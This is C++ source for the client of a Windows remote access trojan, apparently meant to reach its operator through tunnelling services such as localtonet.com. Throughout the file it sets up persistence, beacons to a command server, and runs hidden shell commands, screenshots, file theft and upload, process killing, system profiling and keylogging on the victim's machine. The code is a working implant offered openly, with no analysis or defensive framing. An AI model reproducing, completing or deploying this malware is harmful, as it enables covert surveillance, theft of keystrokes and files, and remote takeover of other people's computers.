#include "client.h"
#include "keylogger.h"
#include "persistence.h"
#include "config.h"
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <gdiplus.h>
#include <lmcons.h>
#include <ws2tcpip.h>
#include <sstream>
#include <fstream>
#include <vector>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "psapi.lib")

RATClient::RATClient(const std::string& host, uint16_t port)
    : m_host(host), m_port(port) {
}

RATClient::~RATClient() { m_running = false; }

void RATClient::Run() {
    WSAData wsa{};
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;

    Persistence::Install();

    while (m_running) {
        ConnectLoop();
        Sleep(5000);
    }

    WSACleanup();
}

void RATClient::ConnectLoop() {
    // getaddrinfo Ч поддерживает доменные имена (localtonet.com и т.п.)
    struct addrinfo hints {};
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    struct addrinfo* result = nullptr;
    std::string portStr = std::to_string(m_port);

    if (getaddrinfo(m_host.c_str(), portStr.c_str(), &hints, &result) != 0) {
        return;
    }

    SOCKET sock = INVALID_SOCKET;
    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sock == INVALID_SOCKET) continue;

        DWORD timeout = 10000;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (sock == INVALID_SOCKET) return;

    char hostname[256] = {};
    gethostname(hostname, sizeof(hostname));
    std::string init = "ONLINE|" + std::string(hostname);
    DarkProtocol::SendPacket(sock, DarkProtocol::CMD_HEARTBEAT, init);

    CommandLoop(sock);
    closesocket(sock);
}

void RATClient::CommandLoop(SOCKET sock) {
    DarkProtocol::CommandID cmd;
    std::string payload;

    while (m_running) {
        if (!DarkProtocol::RecvPacket(sock, cmd, payload)) break;

        switch (cmd) {
        case DarkProtocol::CMD_SHELL:         HandleShell(sock, payload); break;
        case DarkProtocol::CMD_SCREENSHOT:    HandleScreenshot(sock); break;
        case DarkProtocol::CMD_FILE_LIST:     HandleFileList(sock, payload); break;
        case DarkProtocol::CMD_FILE_DOWNLOAD: HandleFileDownload(sock, payload); break;
        case DarkProtocol::CMD_FILE_UPLOAD:   HandleFileUpload(sock, payload); break;
        case DarkProtocol::CMD_PROCESS_LIST:  HandleProcessList(sock); break;
        case DarkProtocol::CMD_PROCESS_KILL:  HandleProcessKill(sock, payload); break;
        case DarkProtocol::CMD_SYSINFO:       HandleSysInfo(sock); break;
        case DarkProtocol::CMD_KEYLOG_START:  HandleKeylog(sock, cmd); break;
        case DarkProtocol::CMD_KEYLOG_DUMP:   HandleKeylog(sock, cmd); break;
        case DarkProtocol::CMD_KEYLOG_STOP:   HandleKeylog(sock, cmd); break;
        case DarkProtocol::CMD_PERSIST:
            Persistence::Install();
            DarkProtocol::SendPacket(sock, DarkProtocol::CMD_PERSIST, "PERSIST_OK");
            break;
        case DarkProtocol::CMD_DISCONNECT:    return;
        default:
            DarkProtocol::SendPacket(sock, static_cast<DarkProtocol::CommandID>(0), "UNKNOWN_CMD");
            break;
        }
    }
}

void RATClient::HandleShell(SOCKET sock, const std::string& payload) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_SHELL, "PIPE_FAIL");
        return;
    }

    STARTUPINFOA si{};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi{};

    std::string cmdLine = "cmd.exe /c " + payload;
    std::vector<char> buf(cmdLine.begin(), cmdLine.end());
    buf.push_back('\0');

    if (!CreateProcessA(nullptr, buf.data(), nullptr, nullptr, TRUE,
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_SHELL, "PROC_FAIL");
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }

    CloseHandle(hWritePipe);
    WaitForSingleObject(pi.hProcess, 15000);

    std::string output;
    char readBuf[4096];
    DWORD bytesRead = 0;

    while (ReadFile(hReadPipe, readBuf, sizeof(readBuf), &bytesRead, nullptr) && bytesRead > 0) {
        output.append(readBuf, bytesRead);
        if (output.size() > 1024 * 1024) break;
    }

    if (output.empty()) output = "(no output)";
    DarkProtocol::SendPacket(sock, DarkProtocol::CMD_SHELL, output);

    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void RATClient::HandleScreenshot(SOCKET sock) {
    using namespace Gdiplus;

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    HDC hdcScreen = GetDC(nullptr);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    Bitmap* bmp = Bitmap::FromHBITMAP(hBmp, nullptr);

    IStream* stream = nullptr;
    CreateStreamOnHGlobal(nullptr, TRUE, &stream);

    CLSID pngClsid;
    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &pngClsid);
    bmp->Save(stream, &pngClsid, nullptr);

    HGLOBAL hGlobal = nullptr;
    GetHGlobalFromStream(stream, &hGlobal);
    SIZE_T dataSize = GlobalSize(hGlobal);
    void* pData = GlobalLock(hGlobal);

    DarkProtocol::SendPacket(sock, DarkProtocol::CMD_SCREENSHOT, pData,
        static_cast<uint32_t>(dataSize));

    GlobalUnlock(hGlobal);
    stream->Release();
    delete bmp;
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);
    GdiplusShutdown(gdiplusToken);
}

void RATClient::HandleFileList(SOCKET sock, const std::string& path) {
    std::string searchPath = path.empty() ? "C:\\" : path;
    if (searchPath.back() != '\\' && searchPath.back() != '/')
        searchPath += "\\";
    searchPath += "*";

    WIN32_FIND_DATAA findData{};
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    std::ostringstream oss;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            oss << (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ? "[DIR]  " : "[FILE] ");
            oss << findData.cFileName << "\n";
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
    else {
        oss << "ACCESS_DENIED_OR_EMPTY";
    }

    DarkProtocol::SendPacket(sock, DarkProtocol::CMD_FILE_LIST, oss.str());
}

void RATClient::HandleFileDownload(SOCKET sock, const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) {
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_FILE_DOWNLOAD, "FILE_NOT_FOUND");
        return;
    }
    std::string content((std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>());
    file.close();
    DarkProtocol::SendPacket(sock, DarkProtocol::CMD_FILE_DOWNLOAD, content);
}

void RATClient::HandleFileUpload(SOCKET sock, const std::string& remotePath) {
    size_t sep = remotePath.find('|');
    if (sep == std::string::npos) {
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_FILE_UPLOAD, "BAD_FORMAT");
        return;
    }
    std::string filePath = remotePath.substr(0, sep);
    std::string content = remotePath.substr(sep + 1);

    std::ofstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_FILE_UPLOAD, "WRITE_FAIL");
        return;
    }
    file.write(content.data(), content.size());
    file.close();
    DarkProtocol::SendPacket(sock, DarkProtocol::CMD_FILE_UPLOAD, "UPLOAD_OK");
}

void RATClient::HandleProcessList(SOCKET sock) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_PROCESS_LIST, "SNAP_FAIL");
        return;
    }

    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(PROCESSENTRY32);

    std::ostringstream oss;
    if (Process32First(hSnap, &pe)) {
        do {
            oss << "PID:" << pe.th32ProcessID << " | " << pe.szExeFile << "\n";
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    DarkProtocol::SendPacket(sock, DarkProtocol::CMD_PROCESS_LIST, oss.str());
}

void RATClient::HandleProcessKill(SOCKET sock, const std::string& pidStr) {
    DWORD pid = static_cast<DWORD>(std::stoul(pidStr));
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProc) {
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_PROCESS_KILL, "OPEN_FAIL");
        return;
    }
    if (TerminateProcess(hProc, 1)) {
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_PROCESS_KILL, "KILLED");
    }
    else {
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_PROCESS_KILL, "TERM_FAIL");
    }
    CloseHandle(hProc);
}

void RATClient::HandleSysInfo(SOCKET sock) {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD nameLen = sizeof(computerName);
    GetComputerNameA(computerName, &nameLen);

    char userName[UNLEN + 1] = {};
    DWORD userLen = sizeof(userName);
    GetUserNameA(userName, &userLen);

    OSVERSIONINFOA osvi{};
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osvi);

    MEMORYSTATUSEX mem{};
    mem.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&mem);

    std::ostringstream oss;
    oss << "Computer: " << computerName << "\n"
        << "User: " << userName << "\n"
        << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion
        << " Build " << osvi.dwBuildNumber << "\n"
        << "RAM Total: " << mem.ullTotalPhys / (1024 * 1024) << " MB\n"
        << "RAM Avail: " << mem.ullAvailPhys / (1024 * 1024) << " MB\n"
        << "CPU Cores: " << std::thread::hardware_concurrency() << "\n";

    DarkProtocol::SendPacket(sock, DarkProtocol::CMD_SYSINFO, oss.str());
}

void RATClient::HandleKeylog(SOCKET sock, DarkProtocol::CommandID sub) {
    static Keylogger kl;

    if (sub == DarkProtocol::CMD_KEYLOG_START) {
        kl.Start();
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_KEYLOG_START, "KEYLOG_RUNNING");
    }
    else if (sub == DarkProtocol::CMD_KEYLOG_STOP) {
        kl.Stop();
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_KEYLOG_STOP, "KEYLOG_STOPPED");
    }
    else if (sub == DarkProtocol::CMD_KEYLOG_DUMP) {
        std::string log = kl.Dump();
        DarkProtocol::SendPacket(sock, DarkProtocol::CMD_KEYLOG_DUMP, log);
    }
}

// ---- main ---- читает конфиг-файл р€дом с exe ----
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string exeDir(exePath);
    size_t lastSlash = exeDir.find_last_of("\\/");
    if (lastSlash != std::string::npos) exeDir = exeDir.substr(0, lastSlash + 1);

    ClientConfig cfg = ClientConfig::Load(exeDir + "winupsvc.cfg");
    RATClient client(cfg.host, cfg.port);
    client.Run();
    return 0;
}